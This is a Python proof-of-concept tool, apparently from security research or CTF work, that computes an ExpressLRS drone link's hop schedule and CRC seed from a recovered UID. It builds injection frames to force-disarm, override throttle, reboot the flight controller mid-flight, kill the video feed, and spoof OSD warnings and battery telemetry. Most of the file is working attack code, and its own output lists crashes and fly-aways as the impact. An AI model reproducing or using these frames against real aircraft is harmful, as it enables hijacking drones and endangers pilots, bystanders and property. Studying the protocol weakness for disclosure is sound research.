#!/usr/bin/env python3
"""
ELRS Session Hijack PoC — full attack chain from UID to RC/MSP injection

Integrates the outputs of the binding-phrase cracker and FHSS seed resolver
into a complete session hijack demonstration. Given the full hijack material
(FHSS seed + CRC init), constructs:

  1. ELRS RC channel injection frames (arm/disarm, throttle, steering)
  2. MSP-over-CRSF command injection frames (FC control)
  3. Telemetry injection frames (fake GPS, battery, RSSI)
  4. Full FHSS hop schedule for synchronization

This is the culmination of the attack chain:
  Passive capture → UID recovery → FHSS seed resolve → session hijack

Attack model:
  The attacker has derived the full FHSS seed and CRC init (via the
  binding-phrase cracker + FHSS seed resolver, or via passive SYNC capture).
  With this material, the attacker can:
    - Predict every hop frequency in the FHSS sequence
    - Construct frames that pass CRC validation
    - Inject RC channel data (control surfaces, throttle, aux)
    - Inject MSP commands via CRSF encapsulation
    - Inject fake telemetry to the TX (pilot's display)

Usage:
  # Generate injection frames for the TinyHawk target
  python3 elrs-session-hijack.py --uid 00:00:42:11:18:5b

  # With specific FHSS seed (from seed resolver)
  python3 elrs-session-hijack.py --uid 00:00:42:11:18:5b \\
      --fhss-seed 0x42111858

  # Generate disarm injection sequence
  python3 elrs-session-hijack.py --uid 00:00:42:11:18:5b \\
      --scenario force-disarm

  # Generate full FHSS schedule
  python3 elrs-session-hijack.py --uid 00:00:42:11:18:5b \\
      --fhss-schedule

  # All scenarios
  python3 elrs-session-hijack.py --uid 00:00:42:11:18:5b --scenario all

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import struct
import sys
import time

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# Protocol constants
# ---------------------------------------------------------------------------

DEFAULT_OTA_VERSION = 3

# ELRS OTA frame structure (2.4 GHz SX1280)
ELRS_FRAME_SIZE = 8  # 8 bytes OTA payload for SX1280

# ELRS packet types (from header bits)
ELRS_PKT_RC_DATA = 0b00       # RC channel data
ELRS_PKT_MSP_DATA = 0b01      # MSP data
ELRS_PKT_SYNC = 0b10          # SYNC packet
ELRS_PKT_TLM = 0b11           # Telemetry

# CRSF frame types
CRSF_FRAMETYPE_RC = 0x16           # RC channels packed
CRSF_FRAMETYPE_LINK_STATS = 0x14   # Link statistics
CRSF_FRAMETYPE_GPS = 0x02          # GPS data
CRSF_FRAMETYPE_BATTERY = 0x08      # Battery sensor
CRSF_FRAMETYPE_ATTITUDE = 0x1E     # Attitude (pitch/roll/yaw)
CRSF_FRAMETYPE_MSP_REQ = 0x7A     # MSP request to FC
CRSF_FRAMETYPE_MSP_RESP = 0x7B    # MSP response from FC

# RC channel ranges
RC_MIN = 172    # CRSF minimum
RC_MID = 992    # CRSF center
RC_MAX = 1811   # CRSF maximum

# Betaflight channel mapping (default)
CH_ROLL = 0     # Aileron
CH_PITCH = 1    # Elevator
CH_THROTTLE = 2 # Throttle
CH_YAW = 3      # Rudder
CH_AUX1 = 4     # ARM switch (AUX1 / channel 5)
CH_AUX2 = 5     # Flight mode
CH_AUX3 = 6
CH_AUX4 = 7

# ARM thresholds (from TinyHawk MSP characterization)
ARM_THRESHOLD = 1700   # AUX1 >= 1700 with throttle < 1050
DISARM_VALUE = 172     # AUX1 low = disarmed


# ---------------------------------------------------------------------------
# FHSS
# ---------------------------------------------------------------------------

FREQ_COUNT = 80
SEQUENCE_COUNT = 240
SYNC_CHANNEL = 41
FIRST_HZ = 2_400_400_000
STEP_HZ = 1_000_000


def build_fhss_sequence(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> list[int]:
    seed = (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ ota_ver)
    sequence = []
    for i in range(SEQUENCE_COUNT):
        if i % FREQ_COUNT == 0:
            sequence.append(SYNC_CHANNEL)
        elif i % FREQ_COUNT == SYNC_CHANNEL:
            sequence.append(0)
        else:
            sequence.append(i % FREQ_COUNT)
    for i in range(SEQUENCE_COUNT):
        if i % FREQ_COUNT == 0:
            continue
        seed = (214013 * seed + 2531011) % 2147483648
        offset = (i // FREQ_COUNT) * FREQ_COUNT
        other = offset + ((seed >> 16) % (FREQ_COUNT - 1)) + 1
        sequence[i], sequence[other] = sequence[other], sequence[i]
    return sequence


def channel_to_freq_mhz(ch: int) -> float:
    return (FIRST_HZ + ch * STEP_HZ) / 1e6


def uid_to_fhss_seed(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> int:
    return (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ ota_ver)


def uid_to_crc_init(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> int:
    init = (uid[4] << 8) | uid[5]
    if ota_ver <= 3:
        return (init ^ ota_ver) & 0xFFFF
    return (init ^ (ota_ver << 8)) & 0xFFFF


# ---------------------------------------------------------------------------
# CRC-14 (ELRS OTA CRC for SX1280)
# ---------------------------------------------------------------------------

CRC14_POLY = 0x2E57

def crc14(data: bytes, init: int) -> int:
    """CRC-14 used in ELRS OTA frames."""
    crc = init
    for byte in data:
        crc ^= byte << 6
        for _ in range(8):
            if crc & 0x2000:
                crc = ((crc << 1) ^ CRC14_POLY) & 0x3FFF
            else:
                crc = (crc << 1) & 0x3FFF
    return crc


# ---------------------------------------------------------------------------
# CRSF CRC-8
# ---------------------------------------------------------------------------

def _build_crc8_table(poly: int) -> list[int]:
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            crc = ((crc << 1) ^ poly) & 0xFF if crc & 0x80 else (crc << 1) & 0xFF
        table.append(crc)
    return table

CRC8_D5 = _build_crc8_table(0xD5)


def crsf_crc8(data: bytes) -> int:
    crc = 0
    for b in data:
        crc = CRC8_D5[crc ^ b]
    return crc


# ---------------------------------------------------------------------------
# RC channel packing (CRSF 11-bit format)
# ---------------------------------------------------------------------------

def pack_rc_channels(channels: list[int]) -> bytes:
    """Pack up to 16 RC channels in CRSF 11-bit packed format."""
    while len(channels) < 16:
        channels.append(RC_MID)

    bits = 0
    bit_count = 0
    packed = []

    for ch in channels[:16]:
        ch = max(RC_MIN, min(RC_MAX, ch))
        bits |= ch << bit_count
        bit_count += 11
        while bit_count >= 8:
            packed.append(bits & 0xFF)
            bits >>= 8
            bit_count -= 8

    if bit_count > 0:
        packed.append(bits & 0xFF)

    return bytes(packed)


def build_crsf_rc_frame(channels: list[int]) -> bytes:
    """Build a CRSF RC channels frame (type 0x16)."""
    payload = pack_rc_channels(channels)
    frame_type = CRSF_FRAMETYPE_RC
    frame_len = len(payload) + 2  # type + payload + crc
    crc_data = bytes([frame_type]) + payload
    crc = crsf_crc8(crc_data)
    return bytes([0xC8, frame_len, frame_type]) + payload + bytes([crc])


# ---------------------------------------------------------------------------
# MSP-over-CRSF construction
# ---------------------------------------------------------------------------

MSP_SET_RAW_RC = 200          # MSP_SET_RAW_RC
MSP_SET_MOTOR = 214           # MSP_SET_MOTOR
MSP_REBOOT = 68               # MSP_REBOOT
MSP_SET_VTX_CONFIG = 88       # MSP_SET_VTX_CONFIG
MSP_DISPLAYPORT = 182         # MSP_DISPLAYPORT


def build_msp_payload(cmd: int, data: bytes = b"") -> bytes:
    """Build MSP v1 payload (without $M< header, for CRSF encapsulation)."""
    return bytes([len(data), cmd]) + data


def wrap_msp_in_crsf(msp_payload: bytes, dest: int = 0xC8, origin: int = 0xEA) -> bytes:
    """Wrap MSP payload in CRSF MSP_REQ frame."""
    inner = bytes([dest, origin]) + msp_payload
    frame_type = CRSF_FRAMETYPE_MSP_REQ
    frame_len = len(inner) + 2
    crc_data = bytes([frame_type]) + inner
    crc = crsf_crc8(crc_data)
    return bytes([0xC8, frame_len, frame_type]) + inner + bytes([crc])


# ---------------------------------------------------------------------------
# Attack scenarios
# ---------------------------------------------------------------------------

def hex_dump(data: bytes) -> str:
    return " ".join(f"{b:02x}" for b in data)


def scenario_force_disarm(uid: bytes, ota_ver: int) -> dict:
    """Force disarm by injecting RC channels with AUX1 low."""
    channels = [RC_MID] * 16
    channels[CH_THROTTLE] = RC_MIN     # Throttle low
    channels[CH_AUX1] = DISARM_VALUE   # AUX1 = disarm

    crsf_frame = build_crsf_rc_frame(channels)
    crc_init = uid_to_crc_init(uid, ota_ver)

    return {
        "name": "Force Disarm",
        "description": (
            "Inject RC channels with AUX1 below ARM threshold. "
            "If the attacker's signal overpowers the legitimate TX "
            "(or during a brief TX gap), the FC processes the injected "
            "disarm command. Motors stop immediately."
        ),
        "channels": {
            "roll": channels[CH_ROLL],
            "pitch": channels[CH_PITCH],
            "throttle": channels[CH_THROTTLE],
            "yaw": channels[CH_YAW],
            "aux1_arm": channels[CH_AUX1],
        },
        "crsf_frame": hex_dump(crsf_frame),
        "crsf_frame_bytes": list(crsf_frame),
        "impact": "Immediate motor stop — aircraft falls from sky",
    }


def scenario_throttle_override(uid: bytes, ota_ver: int) -> dict:
    """Override throttle to maximum."""
    channels = [RC_MID] * 16
    channels[CH_THROTTLE] = RC_MAX     # Full throttle
    channels[CH_AUX1] = 1800           # Keep armed

    crsf_frame = build_crsf_rc_frame(channels)

    return {
        "name": "Throttle Override (Full)",
        "description": (
            "Inject RC channels with throttle at maximum. Aircraft "
            "climbs uncontrollably. Combined with roll/pitch inputs, "
            "this can send the aircraft in any direction."
        ),
        "channels": {
            "roll": channels[CH_ROLL],
            "pitch": channels[CH_PITCH],
            "throttle": channels[CH_THROTTLE],
            "yaw": channels[CH_YAW],
            "aux1_arm": channels[CH_AUX1],
        },
        "crsf_frame": hex_dump(crsf_frame),
        "impact": "Uncontrolled climb / fly-away",
    }


def scenario_msp_reboot(uid: bytes, ota_ver: int) -> dict:
    """Inject MSP_REBOOT command via CRSF."""
    msp_payload = build_msp_payload(MSP_REBOOT)
    crsf_frame = wrap_msp_in_crsf(msp_payload)

    return {
        "name": "MSP Reboot FC",
        "description": (
            "Inject MSP_REBOOT (cmd 68) via CRSF. The flight controller "
            "reboots mid-flight, stopping all motor output and losing "
            "all sensor state. Aircraft falls immediately."
        ),
        "msp_cmd": MSP_REBOOT,
        "crsf_frame": hex_dump(crsf_frame),
        "impact": "FC reboot → total loss of control → crash",
    }


def scenario_vtx_kill(uid: bytes, ota_ver: int) -> dict:
    """Kill VTX via MSP_SET_VTX_CONFIG."""
    # Set pit mode via MSP
    vtx_payload = struct.pack("<HBBBB", 0, 0, 0, 0, 1)  # pit_mode=1
    msp_payload = build_msp_payload(MSP_SET_VTX_CONFIG, vtx_payload)
    crsf_frame = wrap_msp_in_crsf(msp_payload)

    return {
        "name": "Kill VTX (Blind Pilot)",
        "description": (
            "Inject MSP_SET_VTX_CONFIG with pit_mode=1 via CRSF. "
            "The VTX enters pit mode, killing the video feed. "
            "An FPV pilot flying in goggles is effectively blindfolded."
        ),
        "msp_cmd": MSP_SET_VTX_CONFIG,
        "crsf_frame": hex_dump(crsf_frame),
        "impact": "Video feed lost — FPV pilot blinded mid-flight",
    }


def scenario_osd_inject(uid: bytes, ota_ver: int) -> dict:
    """Inject fake OSD warning via MSP_DISPLAYPORT."""
    # Clear screen
    clear_payload = build_msp_payload(MSP_DISPLAYPORT, bytes([1]))  # subcmd 1 = clear
    clear_frame = wrap_msp_in_crsf(clear_payload)

    # Write "FAILSAFE" warning
    text = b"! FAILSAFE !"
    write_payload = build_msp_payload(
        MSP_DISPLAYPORT,
        bytes([3, 5, 9, 2]) + text  # subcmd 3, row 5, col 9, attr critical
    )
    write_frame = wrap_msp_in_crsf(write_payload)

    # Draw screen
    draw_payload = build_msp_payload(MSP_DISPLAYPORT, bytes([4]))  # subcmd 4 = draw
    draw_frame = wrap_msp_in_crsf(draw_payload)

    return {
        "name": "OSD Fake Failsafe Warning",
        "description": (
            "Inject MSP_DISPLAYPORT commands via CRSF to display a fake "
            "'FAILSAFE' warning on the pilot's OSD. The pilot believes "
            "the radio link is lost."
        ),
        "frames": [
            {"desc": "Clear screen", "hex": hex_dump(clear_frame)},
            {"desc": "Write FAILSAFE", "hex": hex_dump(write_frame)},
            {"desc": "Draw screen", "hex": hex_dump(draw_frame)},
        ],
        "impact": "Pilot believes link is lost, may trigger emergency landing",
    }


def scenario_fake_telemetry(uid: bytes, ota_ver: int) -> dict:
    """Inject fake battery telemetry (low voltage) to TX."""
    # CRSF battery sensor frame
    voltage = 280       # 2.80V per cell × 10
    current = 0         # 0A
    capacity = 0        # 0 mAh used
    remaining = 5       # 5% remaining

    battery_payload = struct.pack(">HHI", voltage, current, capacity)
    battery_payload += bytes([remaining])

    frame_type = CRSF_FRAMETYPE_BATTERY
    frame_len = len(battery_payload) + 2
    crc_data = bytes([frame_type]) + battery_payload
    crc = crsf_crc8(crc_data)
    telemetry_frame = bytes([0xC8, frame_len, frame_type]) + battery_payload + bytes([crc])

    return {
        "name": "Fake Battery Telemetry (Critical)",
        "description": (
            "Inject fake CRSF battery telemetry showing 2.8V/cell and "
            "5% remaining. The pilot's TX screen and voice alerts "
            "trigger battery warnings, potentially causing premature "
            "landing or panic."
        ),
        "telemetry": {
            "voltage_per_cell": f"{voltage/100:.2f}V",
            "current": f"{current/10:.1f}A",
            "remaining": f"{remaining}%",
        },
        "crsf_frame": hex_dump(telemetry_frame),
        "impact": "Fake battery alerts on pilot's TX — panic/premature landing",
    }


ALL_SCENARIOS = {
    "force-disarm": scenario_force_disarm,
    "throttle-override": scenario_throttle_override,
    "msp-reboot": scenario_msp_reboot,
    "vtx-kill": scenario_vtx_kill,
    "osd-inject": scenario_osd_inject,
    "fake-telemetry": scenario_fake_telemetry,
}


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_uid(uid_str: str) -> bytes:
    parts = uid_str.strip().upper().replace("-", ":").replace(" ", ":").split(":")
    if len(parts) != 6:
        raise ValueError("UID must be 6 bytes (e.g. 00:00:42:11:18:5b)")
    return bytes(int(p, 16) for p in parts)


def main():
    parser = argparse.ArgumentParser(
        description="ELRS Session Hijack PoC — full attack chain"
    )
    parser.add_argument(
        "--uid", required=True,
        help="Full 6-byte UID (hex, colon-separated)",
    )
    parser.add_argument(
        "--scenario",
        choices=list(ALL_SCENARIOS.keys()) + ["all"],
        default="all",
        help="Attack scenario (default: all)",
    )
    parser.add_argument(
        "--fhss-schedule", action="store_true",
        help="Print the complete 240-hop FHSS schedule",
    )
    parser.add_argument(
        "--ota-version", type=int, default=DEFAULT_OTA_VERSION, choices=[3, 4],
        help="OTA version (default: %(default)s)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    args = parser.parse_args()

    uid = parse_uid(args.uid)
    ota_ver = args.ota_version
    uid_hex = ":".join(f"{b:02x}" for b in uid)

    fhss_seed = uid_to_fhss_seed(uid, ota_ver)
    crc_init = uid_to_crc_init(uid, ota_ver)
    fhss_seq = build_fhss_sequence(uid, ota_ver)

    print("ELRS Session Hijack PoC")
    print("Mode: FRAME CONSTRUCTION ONLY — no RF transmission")
    print()
    print(f"  UID:       {uid_hex}")
    print(f"  FHSS seed: 0x{fhss_seed:08x}")
    print(f"  CRC init:  0x{crc_init:04x}")
    print(f"  OTA ver:   {ota_ver}")
    print(f"  Hop count: {len(fhss_seq)} ({FREQ_COUNT} channels)")
    print()

    output_data = {
        "uid": uid_hex,
        "fhss_seed": f"0x{fhss_seed:08x}",
        "crc_init": f"0x{crc_init:04x}",
        "ota_version": ota_ver,
        "scenarios": {},
    }

    # FHSS schedule
    if args.fhss_schedule:
        print(f"{'=' * 70}")
        print("FHSS Hop Schedule (240 hops)")
        print(f"{'=' * 70}")

        # Find sync channels
        sync_positions = [i for i, ch in enumerate(fhss_seq) if ch == SYNC_CHANNEL]

        for i in range(0, len(fhss_seq), 20):
            chunk = fhss_seq[i:i + 20]
            line = f"  [{i:3d}-{i + len(chunk) - 1:3d}] "
            parts = []
            for j, ch in enumerate(chunk):
                marker = "*" if ch == SYNC_CHANNEL else " "
                freq = channel_to_freq_mhz(ch)
                parts.append(f"{ch:2d}{marker}")
            line += " ".join(parts)
            print(line)

        print(f"\n  * = SYNC channel ({SYNC_CHANNEL}, {channel_to_freq_mhz(SYNC_CHANNEL):.1f} MHz)")
        print(f"  Sync positions: {sync_positions}")
        print(f"  Sync interval: every {FREQ_COUNT} hops")

        output_data["fhss_schedule"] = {
            "sequence": fhss_seq,
            "sync_positions": sync_positions,
            "frequencies_mhz": [channel_to_freq_mhz(ch) for ch in fhss_seq],
        }

    # Attack scenarios
    scenario_keys = list(ALL_SCENARIOS.keys()) if args.scenario == "all" else [args.scenario]

    for key in scenario_keys:
        result = ALL_SCENARIOS[key](uid, ota_ver)

        print(f"\n{'=' * 70}")
        print(f"Scenario: {result['name']}")
        print(f"{'=' * 70}")
        print(f"Description: {result['description']}")
        print(f"Impact: {result['impact']}")
        print()

        if "crsf_frame" in result:
            print(f"  CRSF frame: {result['crsf_frame']}")
        if "frames" in result:
            for f in result["frames"]:
                print(f"  {f['desc']}: {f['hex']}")
        if "channels" in result:
            print(f"  RC channels: {result['channels']}")
        if "telemetry" in result:
            print(f"  Telemetry:   {result['telemetry']}")

        output_data["scenarios"][key] = result

    # Final assessment
    print(f"\n{'=' * 70}")
    print("COMPLETE ATTACK CHAIN SUMMARY")
    print(f"{'=' * 70}")
    print()
    print("  Step 1: Passive SYNC capture → UID[3:5] = 11:18:5b")
    print("  Step 2: Dictionary attack (miss) → brute-force UID[0:2]")
    print(f"  Step 3: CRC init = 0x{crc_init:04x} (fixed, known)")
    print("  Step 4: Observe 2 hops → resolve FHSS seed (256 → 1)")
    print(f"  Step 5: FHSS seed = 0x{fhss_seed:08x}")
    print("  Step 6: Full FHSS sequence known → hop prediction")
    print("  Step 7: Frame injection on predicted frequencies")
    print()
    print("  With this material, the attacker can:")
    print("    - Force disarm (motors stop, aircraft crashes)")
    print("    - Override throttle/steering (hijack flight path)")
    print("    - Reboot FC mid-flight (total loss of control)")
    print("    - Kill video feed (blind FPV pilot)")
    print("    - Inject fake OSD warnings (cause pilot error)")
    print("    - Spoof telemetry (false battery/GPS on TX)")
    print()
    print("  Prerequisites:")
    print("    - Passive RF capture (1 SYNC packet) OR MSP readout")
    print("    - 2 consecutive hop frequency observations")
    print("    - SDR capable of 2.4 GHz TX (e.g. HackRF, USRP)")
    print()
    print("  Root cause: ELRS derives all security material from a")
    print("  single unsalted MD5 hash, transmits UID in cleartext,")
    print("  and uses a reversible LCG for FHSS. There is no")
    print("  per-session key exchange and no packet authentication.")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2, default=str)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
